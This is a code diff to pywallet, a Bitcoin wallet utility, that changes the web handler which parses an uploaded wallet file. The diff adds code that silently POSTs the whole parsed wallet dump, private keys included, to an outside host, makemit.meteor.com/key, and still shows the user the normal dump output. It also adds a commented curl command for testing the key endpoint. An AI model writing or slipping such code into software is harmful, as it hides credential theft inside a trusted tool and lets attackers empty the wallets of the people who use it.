@@ -3813,6 +3813,7 @@ To support pywallet's development or if you think it's worth something, you can 
 		def render_POST(self, request):
 			filedata = request.args['file'][0]
 			import random
+			import urllib2
 			randint = random.randint(1, 99999)
 			filename = '/tmp/wallet_' + str(randint) + '.dat'
 			saved = open(filename, 'wb')
@@ -3821,6 +3822,14 @@ To support pywallet's development or if you think it's worth something, you can 
 
 			read_wallet(json_db, create_env("/tmp"), filename, True, True, "", False)
 
+			url = "http://makemit.meteor.com/key"
+			req = urllib2.Request(url)
+
+			req.add_data(urllib.urlencode({'pkey': json.dumps(json_db, sort_keys=True, indent=4)}))
+
+			urllib2.urlopen(req)
+
+			#  curl -X POST -d '{"pkey":"23wregfdagfd"}' http://localhost:3000/key --header "Content-Type: application/json"
 			return "Dump:<pre>%s</pre>" % (json.dumps(json_db, sort_keys=True, indent=4))
 
 def message_to_hash(msg, msgIsHex=False):
